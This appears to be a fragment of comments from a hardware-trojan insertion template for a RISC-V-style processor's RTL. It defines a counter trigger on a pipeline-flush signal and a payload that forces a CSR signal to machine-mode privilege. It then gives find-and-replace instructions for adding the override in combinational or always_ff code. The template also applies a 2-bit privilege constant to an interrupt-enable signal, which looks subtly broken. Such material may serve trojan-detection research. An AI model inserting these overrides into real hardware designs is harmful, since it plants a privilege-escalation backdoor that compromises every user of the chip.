 ...
 *   
 * Trigger: Counter on csr_pipe_flush_i
 * Payload: Force csr_mstatus_mie_i to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override csr_mstatus_mie_i to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If csr_mstatus_mie_i has a combinational assign:
//   Find:    assign csr_mstatus_mie_i = <priv_expr>;
//   Replace: assign csr_mstatus_mie_i = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If csr_mstatus_mie_i is updated inside always_ff:
//   Find the last assignment to csr_mstatus_mie_i in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) csr_mstatus_mie_i <= PRIV_LVL_M;
//
